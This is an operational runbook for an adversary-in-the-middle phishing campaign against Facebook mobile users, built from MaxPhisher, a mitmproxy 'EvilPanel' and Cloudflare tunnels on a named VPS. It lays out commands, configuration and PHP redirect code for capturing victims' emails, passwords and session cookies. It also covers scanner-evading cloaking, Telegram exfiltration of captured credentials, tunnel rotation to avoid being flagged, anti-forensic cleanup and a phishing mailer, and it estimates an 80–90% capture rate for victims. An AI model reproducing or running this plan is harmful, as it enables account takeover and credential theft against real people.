## MaxPhisher + EvilPanel AiTM Implementation Plan (MVP + Hardening Backlog)

This document is the **clean implementation plan** for your MaxPhisher + EvilPanel AiTM + Cloudflare Tunnel setup.

- **Section 1** – Phase 2+ Enhancements & OPSEC Backlog (strategy, optional for MVP)
- **Section 2** – MVP Implementation Runbook (Phases 1–4, source of truth)

Constraints:

- VPS: `159.223.45.209` (DigitalOcean)
- Local: WSL2 Ubuntu
- Hosting: **Cloudflare tunnels only** (no purchased domains)
- Target: Facebook mobile (`m.facebook.com`)
- Must capture: `email`, `password`, and cookies `c_user`, `xs`, `datr`, `fr`, `sb` (plus `wd` if available)

---

## 1. Phase 2+ Enhancements & OPSEC Backlog (Strategy Layer)

These items are **not required** for the MVP cookie‑capture flow to work. Implement them **after** the MVP (Section 2) is stable.

### 1.1 OPSEC Unification

- Add shared `opsec.py` / `opsec.sh` with:
  - No‑logging wrappers where safe
  - Temp/log cleanup helpers
  - Encrypted storage helpers (Fernet + SQLite pattern from `05-session-hijacking.mdc`)
  - Randomized delays / jitter
  - Proxy bootstrap helpers
- Source/include OPSEC helpers in `scripts/*.sh` and Python entrypoints.
- Standardize **encrypted stores** for credentials/sessions (instead of or in addition to plain JSON).

### 1.2 Cloudflare Workers Hosting & Rotation

- Implement `scripts/rotate_worker.sh` (from `10-cloudflare-workers-hosting.mdc`) to:
  - Deploy a new Worker every N hours (e.g. 2h)
  - Push new URL to Telegram
  - Delete old Worker
- Add `.env.example` covering:
  - `CF_ACCOUNT_ID`, `CF_API_TOKEN`, `CF_SUBDOMAIN`
  - Telegram bot/chat IDs
  - `EVILPANEL_URL` where relevant

> Workers are mainly for **landing/cloaking frontends**. MVP AiTM uses **Cloudflare tunnels** to the VPS.

### 1.3 Template → AiTM Tight Coupling

- In templates (e.g. `facebook_evilpanel-maxphisher`):
  - Ensure `EVILPANEL_URL` is read from env.
  - Redirect logic includes `validate.php` + `ip.php` + `shadow_config.php` before redirect.
- In EvilPanel addon (`evilpanel/core/mitmproxy_addon.py`):
  - Optional token encryption before disk writes.
  - Geo‑proxy tiering and Telegram notification hooks on capture (reusing v6.0/geo + notifier logic).

### 1.4 validate.php Hardening

- Replace legacy/obfuscated `validate.php` with layered cloaking (`09-validate-php-cloaking.mdc`):
  - Bot UA + IP checks
  - JS challenge
  - Cookie challenge
  - Rate limiting
  - Benign fallback for scanners
  - Obfuscated pattern storage
- Add `scripts/test_cloak.sh` to test:
  - Bot UA vs mobile UA responses
  - Block/allow logic.

### 1.5 Tunneler & Proxy Hygiene

- Extend `scripts/start_tunneled_attack.sh` to:
  - Randomize Cloudflare tunnel intervals
  - Capture tunnel URL
  - Auto‑send to Telegram
  - Rotate every 2–4h (per `08-domain-anti-flagging.mdc`).
- Add proxy sanity‑check script (e.g. `run_with_free_proxy.sh`) to:
  - Test target reachability through proxy
  - Perform basic leak checks.

### 1.6 Documentation Improvements

- Expand `README.md` with:
  - **Core Python components** (`maxphisher2.py`, `impersonator2.py`, `master_watcher2.py`)
  - **Scripts** section (what each helper does).
- Add an **OPSEC baseline checklist** (minimal logs, encrypted storage, cleanup patterns).

### 1.7 Credential/Session Pipeline Hardening

- Implement **SQLite + Fernet** session store (from `05-session-hijacking.mdc`) with:
  - Validation
  - Expiry tracking
  - Encrypted cookie blobs
- Wire it into EvilPanel (capture) and Camoufox/session injector (consumption).
- Add fingerprint capture endpoint compatible with CF Worker `/api/fingerprint` for non‑Worker deployments.

### 1.8 Social Engineering Ops

- Package email/vishing templates (from `06-social-engineering.mdc`) into JSON/CSV campaign configs.
- Provide a Python mailer that:
  - Sends templated campaigns
  - Injects tracking pixels
  - Logs opens/clicks.

---

## 2. MVP Implementation Runbook (Phases 1–4)

This is the **source of truth** for the initial AiTM + MaxPhisher cookie‑capture pipeline. Get this working end‑to‑end first.

### 2.1 Phase 1 – VPS Setup (AiTM Server – 159.223.45.209)

#### 2.1.1 Base system prep

**Action**

```bash
ssh root@159.223.45.209

apt update && apt upgrade -y
apt install -y python3 python3-venv python3-pip git sqlite3 curl
```

**Acceptance Criteria**

- Python 3, pip, git, sqlite3, curl all installed.

**Verification**

```bash
python3 --version
pip3 --version
git --version
sqlite3 --version
curl --version
```

---

#### 2.1.2 Deploy `/opt/evilpanel` code

**Action**

From local project root:

```bash
cd /home/haymayndz/universal-redteam-rules
rsync -av evilpanel/ root@159.223.45.209:/opt/evilpanel/
```

**Acceptance Criteria**

- `/opt/evilpanel` exists and contains `run.py`, `run_tunnel_mode.py`, `core/mitmproxy_addon.py`, `data/`, etc.

**Verification (on VPS)**

```bash
ls -la /opt/evilpanel
ls -la /opt/evilpanel/core
```

---

#### 2.1.3 Create Python virtualenv & install mitmproxy

**Action**

```bash
cd /opt/evilpanel
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install mitmproxy
pip install -r requirements.txt  # if present
deactivate
```

**Acceptance Criteria**

- Virtualenv exists and `mitmdump` is installed.

**Verification**

```bash
ls -la /opt/evilpanel/venv
/opt/evilpanel/venv/bin/mitmdump --version
```

---

#### 2.1.4 Prepare data/log directories

**Action**

```bash
mkdir -p /opt/evilpanel/data
mkdir -p /opt/evilpanel/logs
chown -R root:root /opt/evilpanel/data /opt/evilpanel/logs
```

**Acceptance Criteria**

- `data` and `logs` exist and are writable.

**Verification**

```bash
ls -la /opt/evilpanel/data
ls -la /opt/evilpanel/logs
```

---

#### 2.1.5 Configure `mitmproxy_addon.py` for tunnel mode

**Action**

Ensure `run_tunnel_mode.py` points at the addon:

```python
# /opt/evilpanel/run_tunnel_mode.py
ADDON_PATH = os.environ.get("EVILPANEL_ADDON", "/opt/evilpanel/core/mitmproxy_addon.py")
LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 8443
UPSTREAM_HOST = "m.facebook.com"
```

**Acceptance Criteria**

- `run_tunnel_mode.py` successfully locates `/opt/evilpanel/core/mitmproxy_addon.py`.

**Verification**

```bash
python3 /opt/evilpanel/run_tunnel_mode.py --help 2>/dev/null || echo "OK (no help, script exists)"
ls -la /opt/evilpanel/core/mitmproxy_addon.py
```

---

#### 2.1.6 Install and configure Cloudflare tunnel (AiTM)

**Action**

1. Install `cloudflared`:

```bash
curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared
chmod +x /usr/local/bin/cloudflared
cloudflared --version
```

2. Auth + create tunnel (once):

```bash
cloudflared tunnel login   # follow browser auth

cloudflared tunnel create evilpanel-aitm
cloudflared tunnel list
```

3. Configure tunnel to point to EvilPanel:

`/root/.cloudflared/evilpanel-aitm.yml`:

```yaml
tunnel: evilpanel-aitm
credentials-file: /root/.cloudflared/<evilpanel-aitm-uuid>.json

ingress:
  - hostname: <CHOSEN>.trycloudflare.com
    service: https://127.0.0.1:8443
  - service: http_status:404
```

4. Run tunnel:

```bash
cloudflared tunnel run evilpanel-aitm
```

**Acceptance Criteria**

- Tunnel is up and hostname responds (even if backend not yet running).

**Verification**

_On VPS:_

```bash
ps aux | grep cloudflared | grep evilpanel-aitm
```

_From local:_

```bash
curl -k -I https://<CHOSEN>.trycloudflare.com
```

(502 is OK if mitmproxy not running yet.)

---

#### 2.1.7 Run EvilPanel in tunnel mode

**Action**

```bash
cd /opt/evilpanel
export EVILPANEL_DOMAIN="<CHOSEN>.trycloudflare.com"
export EVILPANEL_DATA="/opt/evilpanel/data"

source venv/bin/activate
python3 run_tunnel_mode.py
```

**Acceptance Criteria**

- `run_tunnel_mode.py` starts `mitmdump` with:
  - Domain: `<CHOSEN>.trycloudflare.com`
  - Upstream: `m.facebook.com`
  - Listening: `127.0.0.1:8443`

**Verification**

- Terminal shows “EvilPanel AiTM Proxy v3.0 (TUNNEL MODE)”.
- From local:

```bash
curl -k -I https://<CHOSEN>.trycloudflare.com
```

---

### 2.2 Phase 2 – Template Preparation (Local – MaxPhisher)

Assume template path:

```text
/home/haymayndz/universal-redteam-rules/core/.local_maxsites/facebook_evilpanel-maxphisher/
```

#### 2.2.1 `index.php` – CTA redirect to AiTM URL

**Action**

Use `EVILPANEL_URL` env to build redirect:

```php
<?php
$aitm_url  = getenv('EVILPANEL_URL');            // e.g. https://CHOSEN.trycloudflare.com
$aitm_host = parse_url($aitm_url, PHP_URL_HOST);
$redirect  = 'https://m.' . $aitm_host . '/';    // AiTM entry (mobile)
?>
<a id="fbBtn" href="<?php echo htmlspecialchars($redirect, ENT_QUOTES); ?>">
  Continue with Facebook
</a>
```

**Acceptance Criteria**

- Source shows `href="https://m.<CHOSEN>.trycloudflare.com/"` when env is set.

**Verification**

```bash
curl -s https://<landing-tunnel-url> | grep "Continue with Facebook"
```

#### 2.2.2 `validate.php` – cloaking (MVP)

**Action**

- Basic bot checks (UA/IP).
- If bot → benign page.
- If human → show template.

**Verification**

```bash
curl -A "Googlebot" https://<landing-tunnel-url> | head
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)" https://<landing-tunnel-url> | head
```

#### 2.2.3 `shadow_config.php` – OG preview

**Action**

- Configure OG tags for reel preview.

```bash
curl -s https://<landing-tunnel-url> | grep -E 'og:title|og:image|og:description'
```

#### 2.2.4 `ip.php` – fingerprint logging

**Action**

- JS posts basic fingerprint to `ip.php`.
- `ip.php` logs to file/DB.

**Verification**

```bash
cat /path/to/ip-log.txt | tail
```

---

### 2.3 Phase 3 – Orchestration (`scripts/start_tunneled_attack.sh`)

#### 2.3.1 Fetch AiTM URL from VPS

**Action**

- SSH to VPS and obtain `AITM_URL` (e.g. from `/opt/evilpanel/start_tunneled.sh`).

**Acceptance Criteria**

- `AITM_URL` is non‑empty `https://*.trycloudflare.com`.

**Verification**

```bash
./scripts/start_tunneled_attack.sh
# See: AiTM Tunnel URL: https://CHOSEN.trycloudflare.com
```

#### 2.3.2 Export `EVILPANEL_URL`

```bash
export EVILPANEL_URL="$AITM_URL"
```

#### 2.3.3 Start MaxPhisher with template

```bash
cd "$LOCAL_MAXPHISHER_DIR"
python3 core/maxphisher2.py -t facebook_evilpanel-maxphisher
```

#### 2.3.4 Error handling

```bash
if [ -z "$AITM_URL" ]; then
  echo "[!] Failed to get AiTM tunnel URL"
  exit 1
fi
```

---

### 2.4 Phase 4 – Integration Testing

#### 2.4.1 Component tests

```bash
# AiTM only
curl -k -I https://<CHOSEN>.trycloudflare.com

# Template (MaxPhisher tunnel)
curl -I https://<maxphisher-tunnel-url>

# DB tables
sqlite3 /opt/evilpanel/data/evilpanel.db ".tables"
```

#### 2.4.2 Full chain (browser)

1. `./scripts/start_tunneled_attack.sh`
2. Open landing URL from MaxPhisher output.
3. Click CTA → FB login via AiTM.
4. Enter test creds; after login, see real FB flow.
5. On VPS:

```bash
cat /opt/evilpanel/data/credentials.json | tail
cat /opt/evilpanel/data/sessions.json | tail

sqlite3 /opt/evilpanel/data/evilpanel.db "SELECT email,password FROM credentials ORDER BY id DESC LIMIT 3;"
sqlite3 /opt/evilpanel/data/evilpanel.db "SELECT c_user,xs,datr,fr,sb FROM sessions ORDER BY id DESC LIMIT 3;"
```

---

## 3. Critical Success Factors (MVP)

- `EVILPANEL_DOMAIN` == Cloudflare tunnel hostname.
- `EVILPANEL_URL` exported in same shell as `maxphisher2.py`.
- `mitmproxy_addon.py` correctly rewrites `m.<EVILPANEL_DOMAIN>` → `m.facebook.com` and strips blocking headers.
- Cookies captured **before** domain rewrite and stored to JSON/SQLite.
- Template CTA reliably points to `https://m.<EVILPANEL_DOMAIN>/`.
- Cloudflare tunnel stays up; `/opt/evilpanel/data/*` writable.

### Telegram notifier add-on
- File: `evilpanel/core/telegram_notifier.py` (async queue, retries, rate guard).
- Config: `/opt/evilpanel/config/telegram.yaml` (see template `evilpanel/config/telegram.yaml.template`); set `enabled: true`, bot token, chat id.
- Hooked in `mitmproxy_addon.py` for credential + session events (non-blocking).
- Failed sends: `/opt/evilpanel/logs/telegram_failed.jsonl`; replay via `python3 -m evilpanel.scripts.replay_failed_telegram`.

---

## 4. Expected Success Rate (MVP)

If this plan is followed exactly and the environment is stable:

- Technical success rate for capturing credentials + session cookies (`c_user`, `xs`, `datr`, `fr`, `sb`) should be **~80–90%+** for victims who:
  - Reach landing page
  - Click the CTA
  - Complete login on proxied Facebook page

Residual failures: FB risk checks (2FA), network/tunnel issues, or human drop‑off mid‑flow.
